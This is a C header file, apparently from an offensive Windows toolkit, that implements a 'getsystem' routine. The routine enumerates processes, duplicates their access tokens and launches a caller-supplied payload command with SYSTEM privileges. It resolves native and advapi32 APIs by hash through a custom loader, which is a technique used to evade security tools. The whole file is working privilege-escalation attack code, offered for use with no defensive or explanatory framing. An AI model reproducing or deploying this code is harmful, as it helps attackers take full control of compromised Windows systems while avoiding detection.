#ifndef GETSYSTEM_H
#define GETSYSTEM_H

#include "winapi_loader.h"

STRINGW(advapi32_dll, "advapi32.dll")
#define createprocesswithtokenw HASH("CreateProcessWithTokenW")
#define ntallocatevirtualmemory HASH("NtAllocateVirtualMemory")
#define ntfreevirtualmemory HASH("NtFreeVirtualMemory")
#define ntquerysysteminformation HASH("NtQuerySystemInformation")
#define ntopenprocess HASH("NtOpenProcess")
#define ntopenprocesstoken HASH("NtOpenProcessToken")
#define ntduplicatetoken HASH("NtDuplicateToken")
#define ntclose HASH("NtClose")

typedef BOOL (WINAPI *CreateProcessWithTokenW_t)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *NtFreeVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtOpenProcess_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef NTSTATUS (NTAPI *NtOpenProcessToken_t)(HANDLE, ACCESS_MASK, PHANDLE);
typedef NTSTATUS (NTAPI *NtDuplicateToken_t)(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, BOOLEAN, TOKEN_TYPE, PHANDLE);
typedef NTSTATUS (NTAPI *NtClose_t)(HANDLE);

typedef struct _SYSTEM_PROCESS_INFO {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
} SYSTEM_PROCESS_INFO;

int CreateProcessAsSystemW(LPWSTR payloadCmd, int nShowCmd) {
    HMODULE hNtdll = myGetModuleHandleH(ntdll_dll);

    NtDuplicateToken_t NtDuplicateToken = (NtDuplicateToken_t)myGetProcAddressH(hNtdll, ntduplicatetoken);
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)myGetProcAddressH(hNtdll, ntallocatevirtualmemory);
    NtFreeVirtualMemory_t NtFreeVirtualMemory = (NtFreeVirtualMemory_t)myGetProcAddressH(hNtdll, ntfreevirtualmemory);
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)myGetProcAddressH(hNtdll, ntquerysysteminformation);
    NtOpenProcess_t NtOpenProcess = (NtOpenProcess_t)myGetProcAddressH(hNtdll, ntopenprocess);
    NtOpenProcessToken_t NtOpenProcessToken = (NtOpenProcessToken_t)myGetProcAddressH(hNtdll, ntopenprocesstoken);
    NtClose_t NtClose = (NtClose_t)myGetProcAddressH(hNtdll, ntclose);
    LdrLoadDll_t LdrLoadDll = (LdrLoadDll_t)myGetProcAddressH(hNtdll, ldrloadll);

    int result = 0;

    SIZE_T size = 1 << 20;
    void* buffer = NULL;

    NtAllocateVirtualMemory((HANDLE)-1, &buffer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    while (NtQuerySystemInformation(SystemProcessInformation, buffer, (ULONG)size, (PULONG)&size) == 0xC0000004)
    {
        NtFreeVirtualMemory((HANDLE)-1, &buffer, &size, MEM_RELEASE);

        buffer = NULL;

        NtAllocateVirtualMemory((HANDLE)-1, &buffer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    SYSTEM_PROCESS_INFO* info = (SYSTEM_PROCESS_INFO*)buffer;

    UNICODE_STRING ustr;
    InitUnicodeString(&ustr, advapi32_dll);
    
    HMODULE hAdvapi32 = NULL;
    LdrLoadDll(NULL, 0, &ustr, (PHANDLE)&hAdvapi32);

    CreateProcessWithTokenW_t CreateProcessWithTokenW = (CreateProcessWithTokenW_t)myGetProcAddressH(hAdvapi32, createprocesswithtokenw);

    for (;;)
    {
        HANDLE hProcess = NULL;
        OBJECT_ATTRIBUTES oa;
        CLIENT_ID cid;

        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
        cid.UniqueProcess = info->UniqueProcessId;
        cid.UniqueThread = NULL;

        if (NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid) == 0)
        {
            HANDLE hToken = NULL;

            if (NtOpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken) == 0)
            {
                HANDLE primary = NULL;

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
                
                if (NtDuplicateToken(hToken,
                        TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY |
                        TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
                        &oa,
                        FALSE,
                        TokenPrimary,
                        &primary) == 0)
                {
                    STARTUPINFOW si = {0};
                    PROCESS_INFORMATION pi;

                    si.cb = sizeof(si);
                    si.dwFlags = STARTF_USESHOWWINDOW;
                    si.wShowWindow = nShowCmd;

                    wchar_t* wcmd = payloadCmd;

                    if (CreateProcessWithTokenW(primary, 0, NULL, wcmd, 0, NULL, NULL, &si, &pi))
                    {
                        result = 1;
                        NtClose(pi.hThread);
                        NtClose(pi.hProcess);

                        NtClose(primary);
                        NtClose(hToken);
                        NtClose(hProcess);

                        break;
                    }

                    NtClose(primary);
                }

                NtClose(hToken);
            }

            NtClose(hProcess);
        }

        if (!info->NextEntryOffset)
            break;

        info = (SYSTEM_PROCESS_INFO*)((char*)info + info->NextEntryOffset);
    }

    NtFreeVirtualMemory((HANDLE)-1, &buffer, &size, MEM_RELEASE);

    return result;
}

#endif // GETSYSTEM_H
